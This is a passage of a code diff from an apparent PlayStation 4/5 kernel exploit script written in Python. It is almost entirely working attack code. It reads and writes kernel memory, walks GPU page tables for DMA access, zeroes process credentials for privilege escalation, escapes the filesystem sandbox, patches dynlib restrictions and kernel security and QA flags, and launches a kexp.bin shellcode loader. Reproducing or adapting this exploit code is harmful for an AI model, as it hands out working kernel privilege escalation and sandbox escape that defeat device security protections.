-            raise Exception("failed to translate %s to physical addr" % hex(addr))
-
-        writebuf(self.transfer_va, buf)
-        self.transfer_physical_buffer(phys_addr, len(buf), is_write=True)
-
-    def read_byte(self, dest):
-        buf = self.read_buffer(dest, 1)
-        return struct.unpack("<B", buf)[0]
-
-    def read_word(self, dest):
-        buf = self.read_buffer(dest, 2)
-        return struct.unpack("<H", buf)[0]
-
-    def read_dword(self, dest):
-        buf = self.read_buffer(dest, 4)
-        return struct.unpack("<I", buf)[0]
-
-    def read_qword(self, dest):
-        buf = self.read_buffer(dest, 8)
-        return struct.unpack("<Q", buf)[0]
-
-    def write_byte(self, dest, value):
-        buf = struct.pack("<B", value)
-        self.write_buffer(dest, buf)
-
-    def write_word(self, dest, value):
-        buf = struct.pack("<H", value)
-        self.write_buffer(dest, buf)
-
-    def write_dword(self, dest, value):
-        buf = struct.pack("<I", value)
-        self.write_buffer(dest, buf)
-
-    def write_qword(self, dest, value):
-        buf = struct.pack("<Q", value)
-        self.write_buffer(dest, buf)
-
-    def gpu_pde_field(self, pde, field):
-        shift = GPU_PDE_SHIFT[field]
-        mask = GPU_PDE_MASKS[field]
-        return (pde >> shift) & mask
-
-    def gpu_walk_pt(self, vmid, virt_addr):
-        pdb2_addr = self.get_pdb2_addr(vmid)
-
-        pml4e_index = (virt_addr >> 39) & 0x1FF
-        pdpe_index = (virt_addr >> 30) & 0x1FF
-        pde_index = (virt_addr >> 21) & 0x1FF
-
-        # pdb2
-        pml4e = kernel.read_qword(pdb2_addr + (pml4e_index * 8))
-        if self.gpu_pde_field(pml4e, "VALID") != 1:
-            return None, None
-
-        # pdb1
-        pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK
-        pdpe_va = phys_to_dmap(pdp_base_pa) + (pdpe_index * 8)
-        pdpe = kernel.read_qword(pdpe_va)
-
-        if self.gpu_pde_field(pdpe, "VALID") != 1:
-            return None, None
-
-        # pdb0
-
-        pdp_base_pa = pdpe & GPU_PDE_ADDR_MASK
-        pde_va = phys_to_dmap(pdp_base_pa) + (pde_index * 8)
-        pde = kernel.read_qword(pde_va)
-
-        if self.gpu_pde_field(pde, "VALID") != 1:
-            return None, None
-
-        if self.gpu_pde_field(pde, "IS_PTE") == 1:
-            return pde_va, 0x200000  # 2mb
-
-        # ptb
-
-        fragment_size = self.gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE")
-        offset = virt_addr & 0x1FFFFF
-        pt_base_pa = pde & GPU_PDE_ADDR_MASK
-
-        pte_index, pte, pte_va, page_size = None, None, None, None
-        if fragment_size == 4:
-            pte_index = offset >> 16
-            pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
-            pte = kernel.read_qword(pte_va)
-
-            if (
-                self.gpu_pde_field(pte, "VALID") == 1
-                and self.gpu_pde_field(pte, "TF") == 1
-            ):
-                pte_index = (virt_addr & 0xFFFF) >> 13
-                pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
-                page_size = 0x2000  # 8kb
-            else:
-                page_size = 0x10000  # 64kb
-        elif fragment_size == 1:
-            pte_index = offset >> 13
-            pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
-            page_size = 0x2000  # 8kb
-
-        return pte_va, page_size
-
-    def alloc_main_dmem(self, size, prot, flag):
-        out = alloc(8)
-        mem_type = 1
-
-        ret = self.sceKernelAllocateMainDirectMemory(size, size, mem_type, out)
-        if ret != 0:
-            raise Exception("sceKernelAllocateMainDirectMemory error: %d" % (ret))
-
-        phys_addr = struct.unpack("<Q", out[0:8])[0]
-
-        out[0:8] = b"\0" * 8
-
-        ret = self.sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
-        if ret != 0:
-            raise Exception("sceKernelMapDirectMemory error: %d" % (ret))
-
-        virt_addr = struct.unpack("<Q", out[0:8])[0]
-        return virt_addr, phys_addr
-
-    def get_curproc_vmid(self):
-        vmspace = kernel.read_qword(
-            kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"]
-        )
-        vmid = kernel.read_dword(vmspace + SELECTED_KERNEL_OFFSETS["VMSPACE_VM_VMID"])
-        return vmid
-
-    def get_gvmspace(self, vmid):
-        gvmspace_base = (
-            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_GVMSPACE"]
-        )
-        return gvmspace_base + (vmid * SELECTED_KERNEL_OFFSETS["SIZEOF_GVMSPACE"])
-
-    def get_pdb2_addr(self, vmid):
-        gvmspace = self.get_gvmspace(vmid)
-        return kernel.read_qword(
-            gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_PAGE_DIR_VA"]
-        )
-
-    def get_relative_va(self, vmid, va):
-        gvmspace = self.get_gvmspace(vmid)
-
-        size = kernel.read_qword(gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_SIZE"])
-        start_addr = kernel.read_qword(
-            gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_START_VA"]
-        )
-        end_addr = start_addr + size
-
-        if va >= start_addr and va < end_addr:
-            offset = va - start_addr
-            return offset
-
-        return None
-
-    def get_ptb_entry_of_relative_va(self, virt_addr):
-        vmid = self.get_curproc_vmid()
-        relative_va = self.get_relative_va(vmid, virt_addr)
-
-        if relative_va is None:
-            raise Exception(
-                "invalid virtual addr %s for vmid %d" % (hex(virt_addr), vmid)
-            )
-
-        return self.gpu_walk_pt(vmid, relative_va)
+        for fd in fds:
+            sysint(sc.syscalls.close, fd)
+        for fd in (IPv6KernelRW.pipe_read_fd, IPv6KernelRW.pipe_write_fd):
+            if fd:
+                sysint(sc.syscalls.close, fd)
+    except Exception:
+        log("[-] Cleanup failed: %s" % traceback.format_exc())
 
 
-# credit: @hammer-83
 def find_vmspace_pmap_offset():
     vmspace = kernel.read_qword(
         kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"]
@@ -3748,6 +3613,10 @@ def post_exploitation_ps4():
     calculate_kbase(evf_ptr)
     debug_log("Kernel Base Candidate: %s" % hex(kernel.data_base))
     verify_elf_header()
+
+    if RESTORE_ESCALATION:
+        snapshot_escalation(proc, False)
+
     escape_sandbox(proc)
     apply_kernel_patches_ps4()
 
@@ -3774,23 +3643,6 @@ def post_exploitation_ps5():
 
         raise Exception("failed to find allproc")
 
-    def get_dmap_base():
-        assert kernel.data_base is not None
-
-        OFFSET_PM_PML4 = 0x20
-        OFFSET_PM_CR3 = 0x28
-
-        kernel_pmap_store = (
-            kernel.data_base
-            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_KERNEL_PMAP_STORE"]
-        )
-
-        pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
-        cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
-        dmap_base = pml4 - cr3
-
-        return dmap_base, cr3
-
     def get_additional_kernel_address():
         kernel.allproc_addr = find_allproc()
         kernel.data_base = (
@@ -3799,10 +3651,6 @@ def post_exploitation_ps5():
         kernel.base_addr = (
             kernel.data_base - SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE"]
         )
-
-        dmap_base, kernel_cr3 = get_dmap_base()
-        kernel.dmap_base_addr = dmap_base
-        kernel.kernel_cr3_addr = kernel_cr3
 
     def escape_filesystem_sandbox(proc):
         proc_fd = kernel.read_qword(proc + SELECTED_KERNEL_OFFSETS["PROC_FD"])  # p_fd
@@ -3815,6 +3663,7 @@ def post_exploitation_ps5():
 
     def patch_dynlib_restriction(proc):
         dynlib_obj_addr = kernel.read_qword(proc + 0x3E8)
+        global eboot_segments_ptr, eboot_orig_addr, eboot_orig_size
 
         kernel.write_dword(dynlib_obj_addr + 0x118, 0)  # prop (todo: recheck)
         kernel.write_qword(dynlib_obj_addr + 0x18, 1)  # libkernel ref
@@ -3824,6 +3673,30 @@ def post_exploitation_ps5():
         kernel.write_qword(
             dynlib_obj_addr + 0xF8, 0xFFFFFFFFFFFFFFFF
         )  # libkernel end addr
+
+        eboot_ptr = kernel.read_qword(dynlib_obj_addr + 0x00)
+        if not is_kernel_pointer(eboot_ptr):
+            report(
+                "Privileges",
+                "eboot pointer is not a kernel pointer - kexp.bin cannot resolve its imports",
+            )
+            return
+        segments_ptr = kernel.read_qword(eboot_ptr + 0x40)
+        if not is_kernel_pointer(segments_ptr):
+            report(
+                "Privileges",
+                "eboot segments are not a kernel pointer - kexp.bin cannot resolve its imports",
+            )
+            return
+        eboot_orig_addr = kernel.read_qword(segments_ptr + 0x08)
+        eboot_orig_size = kernel.read_qword(segments_ptr + 0x10)
+        kernel.write_qword(segments_ptr + 0x08, 0)  # addr
+        kernel.write_qword(segments_ptr + 0x10, M64)  # size
+        eboot_segments_ptr = segments_ptr
+        debug_log(
+            "eboot segments widened for dlsym: dynlib %#x, segments %#x, orig addr %#x, orig size %#x"
+            % (dynlib_obj_addr, segments_ptr, eboot_orig_addr, eboot_orig_size)
+        )
 
     def patch_ucred(ucred, authid):
         kernel.write_qword(ucred + 0x4, 0)  # cr_uid
@@ -3857,6 +3730,9 @@ def post_exploitation_ps5():
 
         debug_log("patching curproc %s (authid = %s)" % (hex(proc), hex(authid)))
 
+        if RESTORE_ESCALATION:
+            snapshot_escalation(proc, True)
+
         patch_ucred(ucred, authid)
         patch_dynlib_restriction(proc)
         escape_filesystem_sandbox(proc)
@@ -3869,46 +3745,6 @@ def post_exploitation_ps5():
             "we escaped now? before %d after %d" % (in_sandbox_before, in_sandbox_after)
         )
 
-    def apply_patches_to_kernel_data(accessor):
-        security_flags_addr = (
-            kernel.data_base
-            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
-        )
-        target_id_flags_addr = (
-            kernel.data_base
-            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
-            + 0x9
-        )
-        qa_flags_addr = (
-            kernel.data_base
-            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
-            + 0x24
-        )
-        utoken_flags_addr = (
-            kernel.data_base
-            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
-            + 0x8C
-        )
-
-        # Set security flags
-        debug_log("settings security flags")
-        security_flags = accessor.read_dword(security_flags_addr)
-        accessor.write_dword(security_flags_addr, security_flags | 0x14)
-
-        # Set targetid to DEX
-        debug_log("settings targetid")
-        accessor.write_byte(target_id_flags_addr, 0x82)
-
-        # Set qa flags and utoken flags for debug menu enable
-        debug_log("setting qa flags and utoken flags")
-        qa_flags = accessor.read_dword(qa_flags_addr)
-        accessor.write_dword(qa_flags_addr, qa_flags | 0x10300)
-
-        utoken_flags = accessor.read_byte(utoken_flags_addr)
-        accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1)
-
-        debug_log("debug menu enabled")
-
     debug_log("getting additional kernel addresses...")
     get_additional_kernel_address()
 
@@ -3919,16 +3755,6 @@ def post_exploitation_ps5():
     debug_log("finding additional offsets...")
     find_additional_offsets()
 
-    major_version = int(sc.version.split(".")[0])
-    if major_version >= 7:
-        debug_log("creating GPU object...")
-        gpu = GPU()
-        debug_log("applying patches to kernel data (with GPU DMA method)")
-        apply_patches_to_kernel_data(gpu)
-    else:
-        debug_log("applying patches to kernel data")
-        apply_patches_to_kernel_data(kernel)
-
 
 def kexploit():
     if SHARED_VARS.get("lapsed", False):
@@ -3938,6 +3764,7 @@ def kexploit():
 
     SHARED_VARS["lapsed"] = True
 
+    global prev_core, prev_rtprio
     prev_core = get_current_core()
     prev_rtprio = get_rtprio()
 
@@ -4033,6 +3860,18 @@ def kexploit():
             "victim_sock": IPv6KernelRW.victim_sock,
         }
 
+        if sc.platform == "ps5":
+            stage("building the kexp master / victim pipes")
+            if build_kexp_pipes():
+                stage("launching kexp.bin")
+                if launch_shellcode():
+                    SHARED_VARS["IS_KEXP"] = True
+                    ok_msg("elfldr launched by kexp.bin")
+                else:
+                    report("Kernel", "kexp did not complete")
+            else:
+                report("Kernel", "kexp pipes were not built")
+
         log("done!")
     except:
         log("[-] Exploit failed")
@@ -4042,6 +3881,8 @@ def kexploit():
         sc.send_notification("Lapse failed, please reboot the console.")
         log_exc(exc_msg)
     finally:
+        rescue()
+
         sc.syscalls.close(block_fd)
         sc.syscalls.close(unblock_fd)
 
@@ -4060,8 +3901,7 @@ def kexploit():
 
         debug_log("restoring to previous core/rtprio")
 
-        pin_to_core(prev_core)
-        set_rtprio(prev_rtprio)
+        restore_thread_attributes()
 
 
 kexploit()
